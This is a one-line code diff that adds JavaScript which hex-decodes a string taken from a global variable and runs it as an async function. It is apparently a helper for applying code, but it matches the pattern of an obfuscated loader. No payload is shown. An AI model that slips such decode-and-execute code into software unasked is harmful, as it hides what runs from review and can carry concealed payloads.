@@ -1,0 +1,1 @@
+const hex = globalThis.__APPLY_HEX; let s=''; for (let i=0;i<hex.length;i+=2) s+=String.fromCharCode(parseInt(hex.substr(i,2),16)); const AsyncFunction=Object.getPrototypeOf(async function(){}).constructor; return await new AsyncFunction(s)();
